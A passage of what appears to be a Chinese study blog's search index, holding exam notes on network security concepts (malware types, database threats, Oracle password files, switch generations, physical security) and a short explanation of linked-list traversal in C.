网络数据包分析软件 Metasploit 网络安全漏洞验证软件 0IIyDBG 分析调试器 恶意代码分类\n主动传播\n网络蠕虫 其他 被动传播\n计算机病毒 特洛伊木马 间谍软件 逻辑炸弹 数据隐私保护\n隐私保护的常见技术措施有抑制、泛化、置换、扰动、裁剪等。其中，抑制是通过将数据置空的方式限制数据发布:泛化是通过降低数据精度来提供匿名的方法:置换方法改变数据的属主;扰动是在数据发布时添加一定的噪声，包括数据增删、变换等，使攻击者无法区分真实数据和噪声数据，从而对攻击者造成干扰;裁剪是将敏感数据分开发布。\n风险评估\n电子证据与传统证据不同，具有以下三个特点:\n(1)高科技性是指电子证据的产生、储存和传输，都必须借助计算机技术、,存储技术、网络技术离开了相应技术设备，电子证据就无法保存和传输。(2)无形性是指电子证据肉眼不能够直接看见，必须借助适当的工具。(3)易破坏性是指电子证据很容易被篡改、删除而不留任何痕迹。\n渗透测试流程\n日志文件的每一行表示一个消息，由四个域的固定格式组成:\n时间标签(Timestamp)，表示消息发出的日期和时间。 主机名(Hostname)，表示生成消息的计算机的名字。 生成消息的子系统的名字，表示消息来自内核或者是进程的名字。 消息(Message)，即消息的内容。 安全策略\n在Windows系统中需要配置的安全策略主要有账户策略、审计策略、远程访问、文件共享等。其中，策略中又要涉及多个参数，以配置账户策略为例，策略包含下列项目: (1)密码复杂度要求。(2)账户锁定阈值。(范围为0999，如果将阈值设为0，将无法锁定用户，可以无限尝试密码)(3)账户锁定时间。(定义用户锁定的时间，099999分钟)(4)重置账户锁定计数器。(该策略决定了当一个账户被锁定后，需要等待多长时间，系统才自动将记录的失败次数清零。可设置的值是0~99999。)\n数据库所处的环境日益开放，所面临的数据库安全威胁日益增多，\n主要阐述如下:\n(1)授权的误用(Misuses of Authority)。合法用户越权获得他们不应该获得的资源，窃取程序或存储介质，修改或破坏数据。授权用户将自身的访问特权不适当地授予其他用户，导致系统安全策略受到威胁，使用户数据泄露。\n(2)逻辑推断和汇聚(Logical|nference and Aggregation)。利用逻辑推理，把不太敏感的数据结合起来可以推断出敏感信息。进行逻辑推断也可能要用到某些数据库系统以外的知识。与逻辑推断紧密相关的是数据汇聚安全问题，即个别的数据项是不敏感的，但是当足够多的个别数据值收集在一起时，就成为敏感的数据集。 (3)伪装(Masquerade)。攻击者假冒用户身份获取数据库系统的访问权限。 (4)旁路控制(Bypassing Controls)。在数据库设置后门，绕过数据库系统的安全访问控制机制。\n(5)隐蔽信道(Covert Channels)。通常储存在数据库中的数据经由合法的数据信道被取出。与正常的合法信道相反，隐蔽信道利用非正常的通信途径传输数据以躲避数据库安全机制的控制，如共享内 存、临时文件。。攻击者利用数据库应用程序的输入未进行安全检查的漏洞，(6)SQL注入攻击(SQLInjection)欺骗数据库服务器执行恶意的SQL命令。SQL注入攻击常常导致数据库信息泄露，甚至会造成数据系统 的失控。 (7)数据库口令密码破解。利用口今字典或手动猜测数据库用户密码，以达到非授权访问数据库系统的目的。互联网常见的黑客攻击技术手段有“撞库”，其技术原理就是通过收集互联网已泄露的用户+口令密码信息，生成对应的字典表，尝试批量登录其他网站后，得到一系列可以登录的用户(8)硬件及介质攻击。对数据库系统相关的设备和存储介质的物理攻击。\n密码存储\n0racle内部密码，储存在strXXX.cmd文件中，其中XXX是0racle系统ID和SID，默认是“ORCL”这个密码用于数据库启动进程,提供完全访问数据库资源。这个文件在WindowsNT中需要设置权限。 0racle监听进程密码，保存在文件“|istener.ora”(保存着所有的0racle执行密码)中，用于启动和停止0racle的监听进程。这就需要设置一个健壮的密码来代替默认的，并且必须对访问设置权限。入侵者可以通过这个弱点进行DoS攻击。 0racle的“orapw”文件权限控制，0racle内部密码和账号密码允许SYSDBA角色保存在“orapw’文本文件中，该文件的访问权限应该被限制。即使加密，也能被入侵者暴力破解。 五代交换机\n第一代交换机:集线器，工作于0SI(开放系统互联参考模型)的物理层，主要功能是对接收到的信号进行再生整形放大，延长网络通信线路的传输距离，同时，把网络中的节点汇聚到集线器的一个中心节点上。集线器会把收到的报文向所有端口转发。 第二代交换机又称为以太网交换机，工作于0Sl的数据链路层，称为二层交换机。二层交换机识别数据中的MAC地址信息，并根据MAC地址选择转发端口。 第三代交换机通俗地称为三层交换机，针对ARP/DHCP等广播报文对终端和交换机的影响，三层交换机实现了虚拟网络(VLAN)技术来抑制广播风暴，将不同用户划分为不同的VLAN，VLAN之间的数据包转发通过交换机内置的硬件路由查找功能完成。三层交换机工作于0SI模型的网络层。 第四代交换机为满足业务的安全性、可靠性、QoS等需求，在第二、第三代交换机功能的基础上新增业务功能，如防火墙、负载均衡、IPS 等。这些功能通常由多核CPU实现。 第五代交换机通常支持软件定义网络(SDN)，具有强大的QoS能力。 SNMP 访问控制措施: (1)SNMP访问认证。 (2)限制SNMP访问的IP地址。 关闭SNMP访问。\n","date":"2022-08-29T13:29:17+08:00","permalink":"https://hack.liagu-one.top/rk/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/","title":"知识点汇总"},{"content":"网络信息安全概述 网络安全基础 信息社会主要特征\n物理与环境安全技术 物理安全概述 物理安全威胁\n(1)硬件木马：\n(2)硬件协同的恶意代码：\n(3)硬件安全漏洞利用：\n(4)基于软件漏洞攻击硬件实体：\n(5)基于环境攻击计算机实体：\n物理安全保护\n(1)设备物理安全：防止电磁信息泄露，抗电磁干扰，电源保护，供应链安全，保证软硬件嵌入是可信的\n(2)环境物理安全：机房选择，机房屏蔽，防水火雷鼠盗。\n(3)系统物理安全：存储介质安全，灾难备份恢复，物理设备访问，设备管理和保护，资源利用。\n物理安全保护的方法：安全合规、访问控制、安全屏蔽、故障容错、安全监测与预警、供应链安全管理和容灾备份等。(案例分析/选择)\n机房安全分析与防护 机房分区\n(1)主要工作房间：主机房、终端室等； (2)第一类辅助房间：低压配电间、不间断电源室、蓄电池室、空调机室、发电机室、气体钢瓶室、监控室等 (3)第二类辅助房间：资料室、维修室、技术人员办公室； (4)第三类辅助空间：储藏室、缓冲间、技术人员休息室、盟洗室。\n机房安全等级\nA级（严重损害）、 B级（较大损害）、C级（基本要求）三个基本级别\n机房场地选择 ：应选用二层为宜，一层作为动力、配电、空调间等。\n数据中心建设与设计要求\n数据中心分为三类：超大型数据中心、大型数据中心、中小型数据中心。\n通信线路/设备/存储介质安全 网络通信线路安全分析与防护\n网络通信线路物理威胁：线路被切断、电磁干扰、线路泄露信息。 线路安全防护：设备冗余+线路冗余。屏蔽网线换传输光纤。加密传输。\n设备实体安全分析与防护\n认证技术与原理 与密码学关联，考点\n","date":"2022-08-29T13:29:04+08:00","permalink":"https://hack.liagu-one.top/rk/%E8%BD%AF%E8%80%83%E9%87%8D%E7%82%B9/","title":"软考重点"},{"content":"线性表 01 1 2 3 while(p!=NULL \u0026amp;\u0026amp; j\u0026lt;i) {p=p-\u0026gt;next; j++;} 体详细讲讲p=p-\u0026gt;next是什么意思？\n假设链表的节点结构如下\n1 2 3 4 struct Node { int data; // 节点存储的数据 struct Node* next; // 指向下一个节点的指针 }; 在链表中，p 是一个指向当前节点的指针，p-\u0026gt;next 是当前节点的 next 指针，它指向链表中的下一个节点。\np = p-\u0026gt;next; 这条语句的作用是：\np-\u0026gt;next 获取当前节点 p 的下一个节点的地址。 p = p-\u0026gt;next 将 p 更新为当前节点的下一个节点，即让 p 指向下一个节点。 02 ","date":"2022-08-29T10:31:40+08:00","permalink":"https://hack.liagu-one.top/408/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%97%AE%E9%A2%98%E9%9B%86%E9%94%A6/","title":"数据结构问题集锦"}]